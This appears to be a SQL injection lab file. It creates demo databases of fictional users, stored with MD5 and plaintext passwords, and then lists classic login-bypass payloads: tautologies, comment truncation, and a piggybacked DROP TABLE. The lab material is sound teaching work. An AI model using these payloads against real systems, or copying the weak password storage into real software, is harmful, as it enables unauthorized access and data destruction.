IMPORTANT 
CREATE DATABASE IF NOT EXISTS sql_injection_project;
USE sql_injection_project;

DROP TABLE IF EXISTS users;

CREATE TABLE IF NOT EXISTS users (
    id VARCHAR(20) PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);

INSERT INTO users (id, username, password) VALUES 
('213345', 'admin', MD5('1234')),
('849301', 'user1', MD5('password1')),
('507128', 'user2', MD5('password2')),
('660231', 'alice', MD5('alice123')),
('773094', 'bob', MD5('bobpassword')),
('314785', 'charlie', MD5('charlie123')),
('998112', 'david', MD5('davidpass')),
('420369', 'eve', MD5('evepass123')),
('112233', 'frank', MD5('frank987')),
('887700', 'grace', MD5('grace456')),
('123321', 'heidi', MD5('heidipass')),
('404404', 'ivan', MD5('ivan654')),
('565656', 'judy', MD5('judy1234')),
('303303', 'mallory', MD5('mallorypass')),
('808080', 'nina', MD5('nina321')),
('909090', 'oscar', MD5('oscarpass')),
('121212', 'peggy', MD5('peggy456')),
('787878', 'trent', MD5('trentpass')),
('999999', 'victor', MD5('victor321')),
('606060', 'walter', MD5('walterpass'));

#--------------------------------------------------------------

CREATE DATABASE IF NOT EXISTS sql_injection_project;
USE sql_injection_project;

DROP TABLE IF EXISTS users2;

CREATE TABLE IF NOT EXISTS users2 (
    id VARCHAR(20) PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);

INSERT INTO users2 (id, username, password) VALUES 
('213345', 'admin', '1234'),
('849301', 'user1', 'password1'),
('507128', 'user2', 'password2'),
('660231', 'alice', 'alice123'),
('773094', 'bob', 'bobpassword'),
('314785', 'charlie', 'charlie123'),
('998112', 'david', 'davidpass'),
('420369', 'eve', 'evepass123'),
('112233', 'frank', 'frank987'),
('887700', 'grace', 'grace456'),
('123321', 'heidi', 'heidipass'),
('404404', 'ivan', 'ivan654'),
('565656', 'judy', 'judy1234'),
('303303', 'mallory', 'mallorypass'),
('808080', 'nina', 'nina321'),
('909090', 'oscar', 'oscarpass'),
('121212', 'peggy', 'peggy456'),
('787878', 'trent', 'trentpass'),
('999999', 'victor', 'victor321'),
('606060', 'walter', 'walterpass');
———————————————————————

Tautology: 
User ID: ' OR ' '='
Password: ' OR ' '='

End of line comment: 
User ID: 213345' --(space)

Piggybacked: 
213345'; DROP TABLE users2;

End of line and Tautology: 
' OR 1=1 --(space)
